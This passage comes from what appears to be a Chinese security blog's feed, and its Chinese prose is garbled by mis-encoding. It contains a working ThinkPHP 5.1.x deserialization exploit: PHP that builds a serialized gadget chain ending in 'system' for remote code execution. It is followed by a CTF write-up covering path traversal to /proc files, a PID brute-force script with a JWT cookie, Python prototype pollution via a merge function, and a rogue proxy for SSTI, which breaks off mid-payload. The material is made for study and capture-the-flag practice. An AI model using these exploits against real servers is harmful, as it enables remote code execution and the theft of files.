class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$config</span> = [];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_ajax&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141151590.png" alt="image-20240306141151590"></p><p>è¿™é‡Œä¼šæŠŠ$filtersæ•°ç»„æœ«å°¾çš„nullå¼¹å‡º, ä¹‹åå°±æˆåŠŸrce</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141253331.png" alt="image-20240306141253331"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141316024.png" alt="image-20240306141316024"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-5-1-xååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#ThinkPHP-5-1-xååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5.1.xååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;ThinkPHP 5.1.xååºåˆ—åŒ–&lt;/h1&gt;&lt;p&gt;æˆ‘ä»¬å·²ç»å­¦ä¹ </summary>
      
    
    
    
    
    <category term="ThinkPHPååºåˆ—åŒ–" scheme="http://example.com/tags/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHPå­¦ä¹ </title>
    <link href="http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-03-04T04:45:07.000Z</published>
    <updated>2024-03-04T14:27:09.368Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133210500.png" alt="image-20240304133210500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Swagger docs</title>
    <link href="http://example.com/2024/03/01/Swagger-docs/"/>
    <id>http://example.com/2024/03/01/Swagger-docs/</id>
    <published>2024-03-01T13:05:49.000Z</published>
    <updated>2024-03-02T14:26:13.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h1><p>ä¸€è¿›å»æ˜¯ä¸€ä¸ªæ–‡æ¡£å†…å®¹, è¿˜ä»¥ä¸ºæ˜¯å®¹å™¨æ²¡å¼„å¥½</p><p>ä»”ç»†çœ‹åƒæ˜¯ä¸€äº›apiçš„æ–‡æ¡£,çœ‹ä¸æ‡‚,ä½†æ˜¯æ²¡å…³ç³», ç›´æ¥æ‰”ç»™gpt, è®©ä»–ä¸¾å‡ºå‡ ä¸ªè¯·æ±‚çš„ä¾‹å­</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301211339462.png" alt="image-20240301211339462"></p><p>è¿™é‡Œæœ‰å››æ¡apiæ¥å£, ç®€å•æµè§ˆä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/api-base/v0/register</span><br><span class="line">#æ³¨å†Œ</span><br><span class="line">/api-base/v0/login</span><br><span class="line">#ç™»å½•</span><br><span class="line">/api-base/v0/update</span><br><span class="line">#ä¿®æ”¹å¯†ç </span><br><span class="line">/api-base/v0/search</span><br><span class="line">#æœç´¢æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>ç”±äºå·²ç»çŸ¥é“æ˜¯åŸå‹é“¾æ±¡æŸ“, å…¶å®å¯ä»¥çŒœæµ‹ä¸€ä¸‹</p><ol><li><p>ä¿®æ”¹ç§˜å¯†çš„åœ°æ–¹å¯ä»¥è¿›è¡Œæ±¡æŸ“, å½“ç„¶æ³¨å†Œçš„åœ°æ–¹ä¹Ÿæœ‰ä¸€ä¸ªæ’å…¥çš„æ“ä½œ, ä¹Ÿå¯èƒ½å­˜åœ¨æ±¡æŸ“</p></li><li><p>æœç´¢æ–‡ä»¶çš„åœ°æ–¹å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶, è¯»å–appçš„æºç </p></li></ol><p>å½“ç„¶è¿™åªæ˜¯çŒœæµ‹</p><p>å…ˆé€šè¿‡apiæ³¨å†Œç™»å½•è·å¾—token</p><p>è¿™é‡Œçš„tokenä¸€çœ¼jwt è§£ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301214129531.png" alt="image-20240301214129531"></p><p>è¿™é‡Œä¼šç›´æ¥æŠŠå¯†ç ä¹Ÿå­˜åœ¨é‡Œé¢äº†, ä½†æ˜¯å¹¶ä¸çŸ¥é“ç§é’¥,å¹¶ä¸”çˆ†ç ´ä¸å‡ºæ¥,ä¸èƒ½è¿›è¡Œä¼ªé€ </p><p>tokenå…ˆæ”¾ä¸€æ”¾</p><p>ç®€å•å°è¯•è¿™ä¸ªsearchçš„apiåå‘ç°ç¡®å®å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301212720010.png" alt="image-20240301212720010"></p><p>è¿™é‡Œå¹¶ä¸èƒ½ä½¿ç”¨é€šé…ç¬¦, ä¹Ÿè¯»ä¸åˆ°app.py config.py web.pyè¿™æ ·çš„æºç </p><p>æˆ–è®¸åº”è¯¥å¯»æ‰¾æºç çš„æ–‡ä»¶å</p><p>å¯è°“æ˜¯ç™¾æ€ä¸å¾—å…¶è§£, ç–‘æƒ‘ä¹‹ä¸‹google ç®€å•æœç´¢äº†ä¸€ä¸‹ è¯æ¡ â€œflaskæºæ–‡ä»¶è¯»å–â€</p><p><strong>æŸ³æš—èŠ±æ˜åˆä¸€æ‘</strong></p><p>æˆ‘å‘ç°äº†è¿™ç¯‡æ–‡ç« </p><p><a href="https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cmdlineè¿™ä¸ªæ–‡ä»¶æ¥å¾—åˆ°å½“å‰è¿è¡Œçš„ç¨‹åº</p><blockquote><p>  proc ç›®å½•é€šå¸¸å­˜å‚¨ç€è¿›ç¨‹åŠ¨æ€è¿è¡Œçš„å„ç§ä¿¡æ¯ï¼Œæ˜¯ä¸€ç§è™šç›®å½• ã€&#x2F;proc&#x2F;[pid]&#x2F;  è¡¨ç¤ºå­˜å‚¨è¿™è¿›ç¨‹idä¸ºpid çš„ è¿›ç¨‹ä¿¡æ¯ï¼Œå½“å‰è¿›ç¨‹ pid ç”¨self ä»£æ›¿ï¼Œå³ &#x2F;proc&#x2F;self&#x2F;.</p><pre><code>    /proc/[pid]/cmdline ä¸‹å¯è¯»å‡ºè¿›ç¨‹åœ¨ç»ˆç«¯è¾“å…¥è¿‡çš„å‘½ä»¤å‘½ä»¤ </code></pre></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222256761.png" alt="image-20240301222256761"></p><p>è¿™ä¸‹å°±å¯ä»¥ç›´æ¥è¯»å–æºæ–‡ä»¶äº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222546644.png" alt="image-20240301222546644"></p><p>api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/v2/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_info</span>():</span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> file_path:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file_content = file.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">id</span>:</span><br><span class="line">                    data = json.loads(file_content)</span><br><span class="line">                    <span class="keyword">for</span> user <span class="keyword">in</span> data[<span class="string">&#x27;users&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> user[<span class="string">&#x27;id&#x27;</span>] == <span class="built_in">int</span>(<span class="built_in">id</span>):</span><br><span class="line">                            <span class="keyword">if</span> user:</span><br><span class="line">                                <span class="keyword">return</span> user</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">            <span class="keyword">return</span> file_content</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>,<span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªæœ‰api.pyçš„æºç , ä½†æ˜¯å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„</p><p>è¿™é‡Œ&#x2F;proc&#x2F;[pid]&#x2F;cmdline</p><p>æ—¢ç„¶è¿™ä¸ªæ˜¯pidè¿›ç¨‹, ç†è®ºä¸Šè¿›ç¨‹æ•°æœ€å¤§å€¼ä¸º32768, æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬å°è¯•çˆ†ç ´ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.26:22401//api-base/v0/search?file=../../../../../proc/&#123;&#125;/cmdline&amp;type=text&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.bzD2zo_oMqcmwR5IS_KWlaVChT30zADxFY-wxv91gFo;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32769</span>):</span><br><span class="line">    payload = url.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    res = requests.get(url=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(parse.quote(res.text))</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python%00api.py%00</span><br><span class="line">8</span><br><span class="line">python%00app.py%00</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå´åˆçˆ†å‡ºæ¥äº†app.pyä½†æ˜¯å¹¶ä¸èƒ½æŠŠä»–è¯»å–å‡ºæ¥â€¦ </p><p>ä¸çŸ¥é“æ˜¯å¦æ˜¯å› ä¸ºæƒé™é—®é¢˜</p><p>å›å¤´çœ‹äº†ä¸‹api.pyçš„æºç , è¿™é‡Œé¢çš„è·¯ç”±ä¸º&#x2F;v2&#x2F;usersè€Œä¸æ˜¯ä¸€å¼€å§‹è¯»æ–‡ä»¶çš„è·¯ç”±&#x2F;api-base&#x2F;v0&#x2F;search</p><p>ä½†æ˜¯ä¹Ÿè®¿é—®ä¸åˆ°&#x2F;v2&#x2F;usersè¿™æ¡è·¯ç”±</p><p>è¿™é‡Œæ€ä¹ˆä¹Ÿè¯»å–ä¸åˆ°, ç”¨é¢˜è§£é‡Œçš„æ–¹æ³•ä¹Ÿä¸è¡Œ, ç”±harderå­¦é•¿çš„æç¤ºå°±ç›´æ¥çœ‹æºç äº†</p><p>åœ¨ä¿®æ”¹å¯†ç çš„è·¯ç”±ä¸‹è°ƒç”¨äº†ä¸€ä¸ªupdateå‡½æ•°,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update(new_password, User)</span><br></pre></td></tr></table></figure><p> è·Ÿè¿›ä¼šå‘ç°è¿™æ­£æ˜¯ä¸€ä¸ªç»å…¸çš„mergeå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):   <span class="comment"># merge Ô­ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¾</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    update(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                update(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°†new_passwordç›´æ¥åˆå¹¶åˆ°User</p><p>æˆ‘ä»¬è·Ÿè¿›Userçœ‹çœ‹çš„åŸå‹ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token=jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡è½½äº†_<em>init</em>_, é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡initæ¥æ±¡æŸ“äº†</p><p>ä½†æ˜¯flagåœ¨å“ªå¹¶ä¸çŸ¥é“</p><p>è¿™é‡Œå‘ç°åŠ è½½äº†osæ¨¡å—, é‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡, æˆ–è®¸flagå°±åœ¨ç¯å¢ƒå˜é‡ä¸­</p><p>è¿™é‡Œç®€å•å°è¯•ä¸€ä¸‹æ±¡æŸ“respone0</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101737306.png" alt="image-20240302101737306"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101751821.png" alt="image-20240302101751821"></p><p>å¯ä»¥çœ‹è§å·²ç»æ±¡æŸ“æˆåŠŸäº†</p><p>ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p><p>ä»”ç»†è§‚å¯Ÿæºç å‘ç°searchçš„åœ°æ–¹ç”¨äº†ä¸€æ¬¡æ¸²æŸ“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(data.text)</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªdataæ¥æºäºapi.pyè¯»å–çš„æ–‡ä»¶å†…å®¹</p><p>ç¨å¾®è§‚å¯Ÿapi.py å¯ä»¥é¢„æµ‹åˆ°å½“å‰è¿˜å­˜åœ¨ä¸€ä¸ªuserçš„jsonæ–‡ä»¶</p><p>è¿™æ ·å°±åˆå¯ä»¥æƒ³åˆ°:</p><p>åˆ©ç”¨æ±¡æŸ“å‘useræ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸², å†æŠŠå®ƒè¯»å–å‡ºæ¥æ¸²æŸ“é€ æˆssti</p><p>ç”±äºæ²¡æœ‰å¯¼å…¥user,è¿™é‡Œå¹¶ä¸èƒ½ä¿®æ”¹userçš„å†…å®¹</p><p>åœ¨harderå­¦é•¿çš„æç¤ºä¸‹ å¼€å§‹å°è¯•æ±¡æŸ“http_proxyå˜é‡</p><h2 id="æ³•ä¸€-æ±¡æŸ“HTTP-PROXY"><a href="#æ³•ä¸€-æ±¡æŸ“HTTP-PROXY" class="headerlink" title="æ³•ä¸€(æ±¡æŸ“HTTP_PROXY)"></a>æ³•ä¸€(æ±¡æŸ“HTTP_PROXY)</h2><p>é¦–å…ˆæˆ‘ä»¬åœ¨vpsä¸Šè¿è¡Œä¸€ä¸ªä»£ç†(å½“ç„¶è¿™é‡Œæ˜¯æœ¬åœ°æµ‹è¯•, ä¹Ÿå¯ä»¥ä¸è¦vps), å°†æ¥æ”¶åˆ°çš„è¯·æ±‚ç›´æ¥è¿”å›ä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#123;7*7&#125;&#125;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯¹HTTP_PROXYç¯å¢ƒå˜é‡è¿›è¡Œæ±¡æŸ“, ä½¿å¾—æ‰€æœ‰çš„httpè¯·æ±‚å…¨éƒ¨ä»£ç†åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Š</p><p>payload:</p><figure class="highlight json"><table><tr><td 